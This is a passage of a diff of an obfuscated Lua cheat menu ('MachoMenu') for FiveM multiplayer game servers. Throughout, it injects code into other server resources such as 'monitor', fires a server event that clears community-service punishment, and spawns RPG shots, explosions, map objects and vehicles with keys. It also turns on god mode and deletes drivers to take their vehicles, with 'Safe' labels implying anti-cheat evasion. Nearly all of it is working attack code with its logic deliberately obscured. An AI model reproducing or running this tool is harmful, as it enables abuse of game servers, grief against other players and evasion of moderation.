324)),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end break;end end elseif (v720=="Shoot Car") then local v926=0 + 0 ;while true do if (v926==0) then if (IsControlJustPressed(17 -(12 + 5) ,94 + 80 ) or IsControlJustPressed(0 -0 ,90 + 151 )) then local v970=0;while true do if (v970==(1094 -(277 + 816))) then PlaySoundFrontend( -(4 -3),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end if (v970==0) then v65=v65-(1184 -(1058 + 125)) ;if (v65<(1 + 0)) then v65= #v62;end v970=976 -(815 + 160) ;end end end if (IsControlJustPressed(0 -0 ,415 -240 ) or IsControlJustPressed(0 + 0 ,242)) then local v971=0;while true do if (v971==(0 -0)) then v65=v65 + (1899 -(41 + 1857)) ;if (v65> #v62) then v65=1894 -(1222 + 671) ;end v971=2 -1 ;end if (v971==(1 -0)) then PlaySoundFrontend( -(1183 -(229 + 953)),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end end end break;end end elseif (v720=="Shoot Boat") then if (IsControlJustPressed(0,1948 -(1111 + 663) ) or IsControlJustPressed(1579 -(874 + 705) ,241)) then local v959=0 + 0 ;while true do if ((1 + 0)==v959) then PlaySoundFrontend( -1,"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end if (v959==(0 -0)) then v66=v66-(1 + 0) ;if (v66<(680 -(642 + 37))) then v66= #v63;end v959=1;end end end if (IsControlJustPressed(0 + 0 ,28 + 147 ) or IsControlJustPressed(0 -0 ,242)) then local v960=454 -(233 + 221) ;while true do if ((2 -1)==v960) then PlaySoundFrontend( -(1 + 0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end if (v960==(1541 -(718 + 823))) then v66=v66 + 1 + 0 ;if (v66> #v63) then v66=806 -(266 + 539) ;end v960=2 -1 ;end end end elseif (v720=="Shoot Plane") then if (IsControlJustPressed(1225 -(636 + 589) ,412 -238 ) or IsControlJustPressed(0,241)) then local v973=0;while true do if (v973==0) then v67=v67-1 ;if (v67<(1 -0)) then v67= #v64;end v973=1;end if ((1 + 0)==v973) then PlaySoundFrontend( -(1 + 0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end end end if (IsControlJustPressed(1015 -(657 + 358) ,175) or IsControlJustPressed(0,242)) then v67=v67 + (2 -1) ;if (v67> #v64) then v67=1;end PlaySoundFrontend( -(2 -1),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end elseif (v720=="Map Destroy") then if (IsControlJustPressed(1187 -(1151 + 36) ,174) or IsControlJustPressed(0,233 + 8 )) then local v983=0;while true do if ((0 + 0)==v983) then v69=v69-(2 -1) ;if (v69<(1833 -(1552 + 280))) then v69= #v68;end v983=1;end if (1==v983) then PlaySoundFrontend( -(835 -(64 + 770)),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end end end if (IsControlJustPressed(0 + 0 ,397 -222 ) or IsControlJustPressed(0 + 0 ,1485 -(157 + 1086) )) then v69=v69 + (1 -0) ;if (v69> #v68) then v69=4 -3 ;end PlaySoundFrontend( -(1 -0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end end SetTextFont(4);SetTextProportional(1);SetTextScale(0 -0 ,819.8 -(599 + 220) );SetTextColour(0,255,507 -252 ,255);SetTextOutline();SetTextCentre(true);SetTextEntry("STRING");local v721="["   .. v58[v59]   .. "]" ;if (v720=="Weapon Shot") then local v817=0;local v818;local v819;while true do if (v817==0) then v818=v60[v61];v819=GetLabelText(v818);v817=1932 -(1813 + 118) ;end if (v817==1) then if ((v819=="NULL") or (v819=="")) then v819=v818:gsub("WEAPON_","");end v721="[Weapon Shot: "   .. v819   .. "]" ;break;end end elseif (v720=="Shoot Car") then v721="[Shoot Car: "   .. v62[v65]   .. "]" ;elseif (v720=="Shoot Boat") then v721="[Shoot Boat: "   .. v63[v66]   .. "]" ;elseif (v720=="Shoot Plane") then v721="[Shoot Plane: "   .. v64[v67]   .. "]" ;elseif (v720=="Map Destroy") then v721="[Map Destroy: "   .. v68[v69]   .. "]" ;end AddTextComponentString(v721);DrawText(0.5 + 0 ,1217.9 -(841 + 376) );draw_center_dot();draw_freecam_circle();if IsDisabledControlJustPressed(0,24) then if (v720=="Select") then if (v717 and v719 and (v719~=(0 -0))) then local v949=GetEntityType(v719);local v950=((v949==(1 + 0)) and "Ped") or ((v949==(5 -3)) and "Vehicle") or ((v949==(862 -(464 + 395))) and "Object") or "Unknown" ;MachoMenuNotification("Freecam","Selected: "   .. v950 );end elseif (v720=="Teleportation") then local v951=0 -0 ;while true do if ((0 + 0)==v951) then if v717 then v57=v718;end if (v57~=nil) then local v980=PlayerPedId();local v981=GetVehiclePedIsIn(v980,false);local v982=v57;if (v981 and (v981~=(837 -(467 + 370)))) then SetEntityCoords(v981,v982.x,v982.y,v982.z + 2 ,false,false,false,false);else SetEntityCoords(v980,v982.x,v982.y,v982.z + (1 -0) ,false,false,false,false);end v57=nil;MachoMenuNotification("Freecam","Teleported!");end break;end end elseif (v720=="Weapon Shot") then if v717 then local v974=0 + 0 ;local v975;local v976;while true do if (v974==(3 -2)) then if v976 then MachoMenuNotification("Freecam","Fired: "   .. v975 );else MachoMenuNotification("Freecam","Failed to fire weapon");end break;end if (v974==(0 + 0)) then v975=v60[v61];v976=v70(v708,v710,v975);v974=1;end end end elseif (v720=="RPG") then if v717 then local v984=GetHashKey("WEAPON_RPG");RequestWeaponAsset(v984,31,0 -0 );while  not HasWeaponAssetLoaded(v984) do Wait(520 -(150 + 370) );end ShootSingleBulletBetweenCoords(v708.x,v708.y,v708.z,v718.x,v718.y,v718.z,100,true,v984,PlayerPedId(),true,false,1000);MachoMenuNotification("Freecam","RPG Fired!");end elseif (v720=="Explosion") then if v717 then AddExplosion(v718.x,v718.y,v718.z,7,50,true,false,1283 -(74 + 1208) );MachoMenuNotification("Freecam","Explosion!");end elseif (v720=="Shoot Car") then if v717 then v71(v708,v710,v62[v65]);end elseif (v720=="Shoot Boat") then if v717 then v71(v708,v710,v63[v66]);end elseif (v720=="Shoot Plane") then if v717 then v71(v708,v710,v64[v67]);end elseif (v720=="Map Destroy") then if v717 then local v989=0 -0 ;local v990;while true do if (v989==0) then v990=v72(v718,v68[v69]);if v990 then MachoMenuNotification("Freecam","Spawned: "   .. v68[v69] );end break;end end end end end end end end);MachoMenuCheckbox(v9,"S1DEV Freecam - Safe",function() local v280=0;while true do if (v280==(0 -0)) then v56=true;if  not v54 then ToggleFreeCam();end break;end end end,function() local v281=0 + 0 ;while true do if (v281==(390 -(14 + 376))) then v56=false;CloseFreeCam();break;end end end);MachoMenuButton(v9,"Close Menu",function() local v282=0;while true do if (v282==(0 -0)) then v5=0 + 0 ;MachoMenuDestroy(v4);break;end end end);MachoMenuButton(v9,"Animation Cancel On/Off",function() animCancel= not animCancel;if animCancel then print("Animation cancel ACTIVE - X key");else print("Animation cancel OFF");end end);CreateThread(function() while true do Wait(0 + 0 );if (animCancel and IsControlJustPressed(0 + 0 ,73)) then ClearPedTasksImmediately(PlayerPedId());end end end);MachoMenuButton(v9,"Armor - Safe",function() local v283=PlayerPedId();SetPedArmour(v283,293 -193 );MachoMenuNotification("S1DEV","Armor applied.");end);MachoMenuButton(v9,"Clear Community Service (Safe)",function() MachoInjectResource("any",[[
         TriggerServerEvent('qb-communityservice:finishCommunityService', -1)
-    ]])
-    MachoMenuNotification("[Safe Process]", "Community service clear command applied.")
-end)
-
--- Random Skin Button
-MachoMenuButton(FirstSection, "Random Skin - Safe", function()
-    local ped = PlayerPedId()
-    SetPedRandomComponentVariation(ped, false)
-    SetPedRandomProps(ped)
-    MachoMenuNotification("S1DEV", "Random skin applied.")
-end)
-
--- Tab: Vehicle Menu
-local VehicleTab = MachoMenuAddTab(MenuWindow, "Vehicle Menu")
-
--- Group: Vehicle Creation
-local VehicleSection = MachoMenuGroup(VehicleTab, "Vehicle Creation", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
-
--- Title: Enter Vehicle Model
-MachoMenuText(VehicleSection, "Enter Vehicle Model (e.g., sultan)")
-
--- Vehicle model text input
-local VehicleModelInput = MachoMenuInputbox(VehicleSection, "Vehicle Model", "e.g., sultan")
-
--- Give key status variable
-local GiveKey = false
-
--- Get Vehicle Key? (Checkbox)
-MachoMenuCheckbox(VehicleSection, "Get Vehicle Key?", function()
-    GiveKey = true
-end, function()
-    GiveKey = false
-end)
-
--- Vehicle Creation Button
-MachoMenuButton(VehicleSection, "Create Vehicle", function()
-    local modelName = MachoMenuGetInputbox(VehicleModelInput)
-
-    if modelName and modelName ~= "" then
-        MachoInjectResource('monitor', string.format([[
+    ]]);MachoMenuNotification("[Safe Process]","Community service clear command applied.");end);MachoMenuButton(v9,"Random Skin - Safe",function() local v284=PlayerPedId();SetPedRandomComponentVariation(v284,false);SetPedRandomProps(v284);MachoMenuNotification("S1DEV","Random skin applied.");end);local v73=MachoMenuAddTab(v4,"Vehicle Menu");local v74=MachoMenuGroup(v73,"Vehicle Creation",v3,9,(v1.x-v3) + 150 ,v1.y);MachoMenuText(v74,"Enter Vehicle Model (e.g., sultan)");local v75=MachoMenuInputbox(v74,"Vehicle Model","e.g., sultan");local v76=false;MachoMenuCheckbox(v74,"Get Vehicle Key?",function() v76=true;end,function() v76=false;end);MachoMenuButton(v74,"Create Vehicle",function() local v285=MachoMenuGetInputbox(v75);if (v285 and (v285~="")) then local v535=0;while true do if (v535==(0 + 0)) then MachoInjectResource("monitor",string.format([[
             local modelName = "%s"
             local modelHash = GetHashKey(modelName)
             local giveKey = %s
@@ -1751,174 +222,7 @@ MachoMenuButton(VehicleSection, "Create Vehicle", function()
             end
 
             SetModelAsNoLongerNeeded(modelHash)
-        ]], modelName, tostring(GiveKey), modelName))
-
-        if GiveKey then
-            MachoMenuNotification("Vehicle System", "Vehicle created and key given!")
-        else
-            MachoMenuNotification("Vehicle System", "Vehicle created (No key given)!")
-        end
-    else
-        MachoMenuNotification("Error", "Please enter a valid vehicle model!")
-    end
-end)
-
--- Fix Vehicle Button
-MachoMenuButton(VehicleSection, "Fix Vehicle", function()
-    local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1), false)
-    if vehicle and vehicle ~= 0 then
-        SetVehicleFixed(vehicle)
-        SetVehicleDeformationFixed(vehicle)
-        SetVehicleUndriveable(vehicle, false)
-        MachoMenuNotification("Vehicle repaired.", 2500)
-    else
-        MachoMenuNotification("You are not in a vehicle.", 2500)
-    end
-end)
-
--- Fix Engine Button
-MachoMenuButton(VehicleSection, "Fix Engine", function()
-    local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1), false)
-    if vehicle and vehicle ~= 0 then
-        SetVehicleEngineHealth(vehicle, 1000)
-        Citizen.InvokeNative(0x1FD09E7390A74D54, vehicle, 0)
-    else
-        MachoMenuNotification("You are not in a vehicle.", 2500)
-    end
-end)
-
--- Flip Vehicle Button
-MachoMenuButton(VehicleSection, "Flip Vehicle", function()
-    local playerPed = GetPlayerPed(-1)
-    local playerVeh = GetVehiclePedIsIn(playerPed, true)
-
-    if IsPedInAnyVehicle(playerPed, false) and GetPedInVehicleSeat(playerVeh, -1) == playerPed then
-        SetVehicleOnGroundProperly(playerVeh)
-        MachoMenuNotification("Vehicle flipped.", 2500)
-    else
-        MachoMenuNotification("You are not in the driver's seat.", 2500)
-    end
-end)
-
--- Max Tuning Button
-MachoMenuButton(VehicleSection, "Max Tuning", function()
-    local vehicle = GetVehiclePedIsUsing(PlayerPedId(-1))
-    if vehicle and vehicle ~= 0 then
-        SetVehicleModKit(vehicle, 0)
-        for modType = 0, 49 do
-            local maxMod = GetNumVehicleMods(vehicle, modType) - 1
-            if maxMod >= 0 then
-                SetVehicleMod(vehicle, modType, maxMod, false)
-            end
-        end
-        SetVehicleWindowTint(vehicle, 1)
-        SetVehicleTyresCanBurst(vehicle, false)
-        MachoMenuNotification("Vehicle max tuned!", 2500)
-    else
-        MachoMenuNotification("You are not in a vehicle!", 2500)
-    end
-end)
-
--- Teleport to Nearest Vehicle Button
-MachoMenuButton(VehicleSection, "TP to Nearest Vehicle", function()
-    local playerPed = GetPlayerPed(-1)
-    local playerPedPos = GetEntityCoords(playerPed, true)
-    local NearestVehicle = GetClosestVehicle(playerPedPos, 1000.0, 0, 4)
-    local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
-    local NearestPlane = GetClosestVehicle(playerPedPos, 1000.0, 0, 16384)
-    local NearestPlanePos = GetEntityCoords(NearestPlane, true)
-    MachoMenuNotification("~y~Waiting...", 1000)
-    Citizen.Wait(1000)
-    if (NearestVehicle == 0) and (NearestPlane == 0) then
-        MachoMenuNotification("~b~No vehicle found", 2500)
-    elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
-        if IsVehicleSeatFree(NearestPlane, -1) then
-            SetPedIntoVehicle(playerPed, NearestPlane, -1)
-            SetVehicleAlarm(NearestPlane, false)
-            SetVehicleDoorsLocked(NearestPlane, 1)
-            SetVehicleNeedsToBeHotwired(NearestPlane, false)
-        else
-            local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
-            ClearPedTasksImmediately(driverPed)
-            SetEntityAsMissionEntity(driverPed, 1, 1)
-            DeleteEntity(driverPed)
-            SetPedIntoVehicle(playerPed, NearestPlane, -1)
-            SetVehicleAlarm(NearestPlane, false)
-            SetVehicleDoorsLocked(NearestPlane, 1)
-            SetVehicleNeedsToBeHotwired(NearestPlane, false)
-        end
-        MachoMenuNotification("~g~Teleported to nearest vehicle!", 2500)
-    elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
-        if IsVehicleSeatFree(NearestVehicle, -1) then
-            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
-            SetVehicleAlarm(NearestVehicle, false)
-            SetVehicleDoorsLocked(NearestVehicle, 1)
-            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
-        else
-            local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
-            ClearPedTasksImmediately(driverPed)
-            SetEntityAsMissionEntity(driverPed, 1, 1)
-            DeleteEntity(driverPed)
-            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
-            SetVehicleAlarm(NearestVehicle, false)
-            SetVehicleDoorsLocked(NearestVehicle, 1)
-            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
-        end
-        MachoMenuNotification("~g~Teleported to nearest vehicle!", 2500)
-    else
-        local vehicleDistance = #(playerPedPos - NearestVehiclePos)
-        local planeDistance = #(playerPedPos - NearestPlanePos)
-        if vehicleDistance < planeDistance then
-            if IsVehicleSeatFree(NearestVehicle, -1) then
-                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
-                SetVehicleAlarm(NearestVehicle, false)
-                SetVehicleDoorsLocked(NearestVehicle, 1)
-                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
-            else
-                local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
-                ClearPedTasksImmediately(driverPed)
-                SetEntityAsMissionEntity(driverPed, 1, 1)
-                DeleteEntity(driverPed)
-                SetPedIntoVehicle(playerPed, NearestVehicle, -1)
-                SetVehicleAlarm(NearestVehicle, false)
-                SetVehicleDoorsLocked(NearestVehicle, 1)
-                SetVehicleNeedsToBeHotwired(NearestVehicle, false)
-            end
-            MachoMenuNotification("~g~Teleported to nearest vehicle!", 2500)
-        else
-            if IsVehicleSeatFree(NearestPlane, -1) then
-                SetPedIntoVehicle(playerPed, NearestPlane, -1)
-                SetVehicleAlarm(NearestPlane, false)
-                SetVehicleDoorsLocked(NearestPlane, 1)
-                SetVehicleNeedsToBeHotwired(NearestPlane, false)
-            else
-                local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
-                ClearPedTasksImmediately(driverPed)
-                SetEntityAsMissionEntity(driverPed, 1, 1)
-                DeleteEntity(driverPed)
-                SetPedIntoVehicle(playerPed, NearestPlane, -1)
-                SetVehicleAlarm(NearestPlane, false)
-                SetVehicleDoorsLocked(NearestPlane, 1)
-                SetVehicleNeedsToBeHotwired(NearestPlane, false)
-            end
-            MachoMenuNotification("~g~Teleported to nearest vehicle!", 2500)
-        end
-    end
-end)
-
--- RainCar Spawn
-MachoMenuText(VehicleSection, "RainCar Spawn")
-local VehicleModelInputBoxHandle = MachoMenuInputbox(VehicleSection, "Vehicle Model", "Enter vehicle name")
-
--- Start RainCar Button
-MachoMenuButton(VehicleSection, "Start Vehicle Rain", function()
-    local model = MachoMenuGetInputbox(VehicleModelInputBoxHandle)
-    if model == nil or model == "" then
-        MachoMenuNotification("Error", "Please enter a valid vehicle model!")
-        return
-    end
-
-    MachoInjectResource("monitor", string.format([[
+        ]],v285,tostring(v76),v285));if v76 then MachoMenuNotification("Vehicle System","Vehicle created and key given!");else MachoMenuNotification("Vehicle System","Vehicle created (No key given)!");end break;end end else MachoMenuNotification("Error","Please enter a valid vehicle model!");end end);MachoMenuButton(v74,"Fix Vehicle",function() local v286=GetVehiclePedIsIn(GetPlayerPed( -1),false);if (v286 and (v286~=(78 -(23 + 55)))) then local v536=0 -0 ;while true do if (v536==0) then SetVehicleFixed(v286);SetVehicleDeformationFixed(v286);v536=1;end if (v536==(1 + 0)) then SetVehicleUndriveable(v286,false);MachoMenuNotification("Vehicle repaired.",2245 + 255 );break;end end else MachoMenuNotification("You are not in a vehicle.",3876 -1376 );end end);MachoMenuButton(v74,"Fix Engine",function() local v287=0;local v288;while true do if (v287==(0 + 0)) then v288=GetVehiclePedIsIn(GetPlayerPed( -1),false);if (v288 and (v288~=0)) then local v820=901 -(652 + 249) ;while true do if (v820==(0 -0)) then SetVehicleEngineHealth(v288,2868 -(708 + 1160) );Citizen.InvokeNative(2292506500000000000 -0 ,v288,0 -0 );break;end end else MachoMenuNotification("You are not in a vehicle.",2527 -(10 + 17) );end break;end end end);MachoMenuButton(v74,"Flip Vehicle",function() local v289=GetPlayerPed( -(1 + 0));local v290=GetVehiclePedIsIn(v289,true);if (IsPedInAnyVehicle(v289,false) and (GetPedInVehicleSeat(v290, -(1733 -(1400 + 332)))==v289)) then local v537=0 -0 ;while true do if (v537==0) then SetVehicleOnGroundProperly(v290);MachoMenuNotification("Vehicle flipped.",4408 -(242 + 1666) );break;end end else MachoMenuNotification("You are not in the driver's seat.",1070 + 1430 );end end);MachoMenuButton(v74,"Max Tuning",function() local v291=GetVehiclePedIsUsing(PlayerPedId( -(1 + 0)));if (v291 and (v291~=(0 + 0))) then local v538=940 -(850 + 90) ;while true do if ((1 -0)==v538) then SetVehicleWindowTint(v291,1391 -(360 + 1030) );SetVehicleTyresCanBurst(v291,false);v538=2;end if (2==v538) then MachoMenuNotification("Vehicle max tuned!",2213 + 287 );break;end if (v538==0) then SetVehicleModKit(v291,0);for v877=0,137 -88  do local v878=0;local v879;while true do if (v878==(0 -0)) then v879=GetNumVehicleMods(v291,v877) -(1662 -(909 + 752)) ;if (v879>=0) then SetVehicleMod(v291,v877,v879,false);end break;end end end v538=1224 -(109 + 1114) ;end end else MachoMenuNotification("You are not in a vehicle!",4577 -2077 );end end);MachoMenuButton(v74,"TP to Nearest Vehicle",function() local v292=GetPlayerPed( -(1 + 0));local v293=GetEntityCoords(v292,true);local v294=GetClosestVehicle(v293,1242 -(6 + 236) ,0,3 + 1 );local v295=GetEntityCoords(v294,true);local v296=GetClosestVehicle(v293,1000,0,16384);local v297=GetEntityCoords(v296,true);MachoMenuNotification("~y~Waiting...",805 + 195 );Citizen.Wait(2358 -1358 );if ((v294==0) and (v296==(0 -0))) then MachoMenuNotification("~b~No vehicle found",3633 -(1076 + 57) );elseif ((v294==(0 + 0)) and (v296~=(689 -(579 + 110)))) then local v779=0;while true do if ((0 + 0)==v779) then if IsVehicleSeatFree(v296, -(1 + 0)) then SetPedIntoVehicle(v292,v296, -1);SetVehicleAlarm(v296,false);SetVehicleDoorsLocked(v296,1 + 0 );SetVehicleNeedsToBeHotwired(v296,false);else local v952=0;local v953;while true do if (v952==(410 -(174 + 233))) then SetVehicleDoorsLocked(v296,2 -1 );SetVehicleNeedsToBeHotwired(v296,false);break;end if (v952==2) then SetPedIntoVehicle(v292,v296, -1);SetVehicleAlarm(v296,false);v952=3;end if (v952==0) then v953=GetPedInVehicleSeat(v296, -(1 -0));ClearPedTasksImmediately(v953);v952=1;end if ((1 + 0)==v952) then SetEntityAsMissionEntity(v953,1,1175 -(663 + 511) );DeleteEntity(v953);v952=2 + 0 ;end end end MachoMenuNotification("~g~Teleported to nearest vehicle!",2500);break;end end elseif ((v294~=0) and (v296==0)) then if IsVehicleSeatFree(v294, -(1 + 0)) then local v937=0 -0 ;while true do if (1==v937) then SetVehicleDoorsLocked(v294,1);SetVehicleNeedsToBeHotwired(v294,false);break;end if (v937==0) then SetPedIntoVehicle(v292,v294, -1);SetVehicleAlarm(v294,false);v937=1 + 0 ;end end else local v938=0;local v939;while true do if ((4 -2)==v938) then SetPedIntoVehicle(v292,v294, -(2 -1));SetVehicleAlarm(v294,false);v938=2 + 1 ;end if ((1 -0)==v938) then SetEntityAsMissionEntity(v939,1,1);DeleteEntity(v939);v938=2 + 0 ;end if (v938==(0 + 0)) then v939=GetPedInVehicleSeat(v294, -(723 -(478 + 244)));ClearPedTasksImmediately(v939);v938=1;end if (v938==3) then SetVehicleDoorsLocked(v294,518 -(440 + 77) );SetVehicleNeedsToBeHotwired(v294,false);break;end end end MachoMenuNotification("~g~Teleported to nearest vehicle!",1137 + 1363 );else local v880=0 -0 ;local v881;local v882;while true do if (v880==(1556 -(655 + 901))) then v881= #(v293-v295);v882= #(v293-v297);v880=1 + 0 ;end if (v880==1) then if (v881<v882) then if IsVehicleSeatFree(v294, -(1 + 0)) then local v977=0;while true do if (v977==1) then SetVehicleDoorsLocked(v294,1 + 0 );SetVehicleNeedsToBeHotwired(v294,false);break;end if (v977==(0 -0)) then SetPedIntoVehicle(v292,v294, -(1446 -(695 + 750)));SetVehicleAlarm(v294,false);v977=3 -2 ;end end else local v978=0;local v979;while true do if (v978==(3 -0)) then SetVehicleDoorsLocked(v294,1);SetVehicleNeedsToBeHotwired(v294,false);break;end if (v978==(7 -5)) then SetPedIntoVehicle(v292,v294, -(352 -(285 + 66)));SetVehicleAlarm(v294,false);v978=6 -3 ;end if (v978==(1311 -(682 + 628))) then SetEntityAsMissionEntity(v979,1 + 0 ,300 -(176 + 123) );DeleteEntity(v979);v978=1 + 1 ;end if (0==v978) then v979=GetPedInVehicleSeat(v294, -(1 + 0));ClearPedTasksImmediately(v979);v978=270 -(239 + 30) ;end end end MachoMenuNotification("~g~Teleported to nearest vehicle!",2500);else local v961=0 + 0 ;while true do if (v961==(0 + 0)) then if IsVehicleSeatFree(v296, -(1 -0)) then local v986=0 -0 ;while true do if (v986==0) then SetPedIntoVehicle(v292,v296, -1);SetVehicleAlarm(v296,false);v986=316 -(306 + 9) ;end if (v986==1) then SetVehicleDoorsLocked(v296,1);SetVehicleNeedsToBeHotwired(v296,false);break;end end else local v987=0;local v988;while true do if (v987==(10 -7)) then SetVehicleDoorsLocked(v296,1);SetVehicleNeedsToBeHotwired(v296,false);break;end if (v987==(1 + 1)) then SetPedIntoVehicle(v292,v296, -(1 + 0));SetVehicleAlarm(v296,false);v987=2 + 1 ;end if (v987==(2 -1)) then SetEntityAsMissionEntity(v988,1376 -(1140 + 235) ,1);DeleteEntity(v988);v987=2 + 0 ;end if (v987==(0 + 0)) then v988=GetPedInVehicleSeat(v296, -(1 + 0));ClearPedTasksImmediately(v988);v987=53 -(33 + 19) ;end end end MachoMenuNotification("~g~Teleported to nearest vehicle!",903 + 1597 );break;end end end break;end end end end);MachoMenuText(v74,"RainCar Spawn");local v77=MachoMenuInputbox(v74,"Vehicle Model","Enter vehicle name");MachoMenuButton(v74,"Start Vehicle Rain",function() local v298=0 -0 ;local v299;while true do if (v298==(1 + 0)) then MachoInjectResource("monitor",string.format([[
         if careverActive then
             print("Carever is already running.")
             return
@@ -1949,25 +253,9 @@ MachoMenuButton(VehicleSection, "Start Vehicle Rain", function()
                 Citizen.Wait(math.random(1000, 3000))
             end
         end)
-    ]], model))
-
-    MachoMenuNotification("RainCar", "Vehicle rain started!")
-end)
-
--- Stop RainCar Button
-MachoMenuButton(VehicleSection, "Stop Vehicle Rain", function()
-    MachoInjectResource("monitor", [[
+    ]],v299));MachoMenuNotification("RainCar","Vehicle rain started!");break;end if (v298==(0 -0)) then v299=MachoMenuGetInputbox(v77);if ((v299==nil) or (v299=="")) then MachoMenuNotification("Error","Please enter a valid vehicle model!");return;end v298=1 + 0 ;end end end);MachoMenuButton(v74,"Stop Vehicle Rain",function() local v300=0;while true do if (v300==0) then MachoInjectResource("monitor",[[
         careverActive = false
-    ]])
-    MachoMenuNotification("RainCar", "Vehicle rain stopped!")
-end)
-
--- Helicopter Spawn Button
-MachoMenuButton(VehicleSection, "Helicopter Spawn", function()
-    local playerPed = PlayerPedId()
-    local playerCoords = GetEntityCoords(playerPed)
-    
-    MachoInjectResource("monitor", [[
+    ]]);MachoMenuNotification("RainCar","Vehicle rain stopped!");break;end end end);MachoMenuButton(v74,"Helicopter Spawn",function() local v301=689 -(586 + 103) ;local v302;local v303;while true do if (v301==(0 + 0)) then v302=PlayerPedId();v303=GetEntityCoords(v302);v301=2 -1 ;end if (v301==(1489 -(1309 + 179))) then MachoInjectResource("monitor",[[
         local playerPed = PlayerPedId()
         local playerCoords = GetEntityCoords(playerPed)
         local heliModel = "buzzard2"
@@ -1983,15 +271,7 @@ MachoMenuButton(VehicleSection, "Helicopter Spawn", function()
         SetVehicleEngineOn(helicopter, true, true, true)
         
         SetModelAsNoLongerNeeded(GetHashKey(heliModel))
-    ]])
-    
-    MachoMenuNotification("Helicopter", "Helicopter spawned!")
-end)
-
--- Speedboost SHIFT CTRL Checkbox
-local speedboostActive = false
-MachoMenuCheckbox(VehicleSection, "Speedboost SHIFT CTRL", function()
-    MachoInjectResource("monitor", [[
+    ]]);MachoMenuNotification("Helicopter","Helicopter spawned!");break;end end end);local v78=false;MachoMenuCheckbox(v74,"Speedboost SHIFT CTRL",function() MachoInjectResource("monitor",[[
         speedboostActive = true
         CreateThread(function()
             while speedboostActive do
@@ -2005,18 +285,9 @@ MachoMenuCheckbox(VehicleSection, "Speedboost SHIFT CTRL", function()
                 Wait(0)
             end
         end)
-    ]])
-end, function()
-    MachoInjectResource("monitor", [[
+    ]]);end,function() MachoInjectResource("monitor",[[
         speedboostActive = false
-    ]])
-end)
-
--- Vehicle Godmode Checkbox
-local VehGod = false
-MachoMenuCheckbox(VehicleSection, "Vehicle God Mode", function()
-    VehGod = true
-    MachoInjectResource("monitor", [[
+    ]]);end);local v79=false;MachoMenuCheckbox(v74,"Vehicle God Mode",function() v79=true;MachoInjectResource("monitor",[[
         VehGod = true
         CreateThread(function()
             while VehGod do
@@ -2028,65 +299,14 @@ MachoMenuCheckbox(VehicleSection, "Vehicle God Mode", function()
                 Wait(0)
             end
         end)
-    ]])
-end, function()
-    VehGod = false
-    MachoInjectResource("monitor", [[
+    ]]);end,function() local v304=0 -0 ;while true do if (v304==(0 + 0)) then v79=false;MachoInjectResource("monitor",[[
         VehGod = false
         local playerPed = PlayerPedId()
         if IsPedInAnyVehicle(playerPed, false) then
             local vehicle = GetVehiclePedIsUsing(playerPed)
             SetEntityInvincible(vehicle, false)
         end
-    ]])
-end)
-
--- Waterproof Vehicle Checkbox
-local waterp = false
-local waterpThread = nil
-MachoMenuCheckbox(VehicleSection, "Waterproof Vehicle", function(enabled)
-    waterp = enabled
-    if waterp then
-        if waterpThread == nil then
-            waterpThread = Citizen.CreateThread(function()
-                while waterp do
-                    local playerPed = PlayerPedId()
-                    if IsPedInAnyVehicle(playerPed, false) then
-                        local vehicle = GetVehiclePedIsUsing(playerPed)
-                        SetVehicleEngineOn(vehicle, true, true, true)
-                        SetEntityProofs(vehicle, false, false, true, false, false, false, false, false)
-                    end
-                    Citizen.Wait(0)
-                end
-                waterpThread = nil
-            end)
-        end
-    else
-        local playerPed = PlayerPedId()
-        if IsPedInAnyVehicle(playerPed, false) then
-            local vehicle = GetVehiclePedIsUsing(playerPed)
-            SetEntityProofs(vehicle, false, false, false, false, false, false, false, false)
-        end
-        waterp = false
-    end
-end)
-
--- ============================================================
--- SPAWN CAR WITH KEYS (Added to VehicleSection)
--- ============================================================
-
--- Spawn Car with Keys
-MachoMenuButton(VehicleSection, "Spawn Car with Keys", function()
-    local targetResource = nil
-    if GetResourceState('monitor') == "started" then
-        targetResource = 'monitor'
-    elseif GetResourceState('qb-core') == "started" then
-        targetResource = 'qb-core'
-    else
-        targetResource = 'ox_inventory'
-    end
-    
-    MachoInjectResource2(NewThreadNs, targetResource, [[
+    ]]);break;end end end);local v80=false;local v81=nil;MachoMenuCheckbox(v74,"Waterproof Vehicle",function(v305) local v306=0;while true do if (v306==0) then v80=v305;if v80 then if (v81==nil) then v81=Citizen.CreateThread(function() while v80 do local v954=PlayerPedId();if IsPedInAnyVehicle(v954,false) then local v962=0 -0 ;local v963;while true do if (v962==(1 + 0)) then SetEntityProofs(v963,false,false,true,false,false,false,false,false);break;end if (0==v962) then v963=GetVehiclePedIsUsing(v954);SetVehicleEngineOn(v963,true,true,true);v962=1 -0 ;end end end Citizen.Wait(0 -0 );end v81=nil;end);end else local v821=PlayerPedId();if IsPedInAnyVehicle(v821,false) then local v927=GetVehiclePedIsUsing(v821);SetEntityProofs(v927,false,false,false,false,false,false,false,false);end v80=false;end break;end end end);MachoMenuButton(v74,"Spawn Car with Keys",function() local v307=nil;if (GetResourceState("monitor")=="started") then v307="monitor";elseif 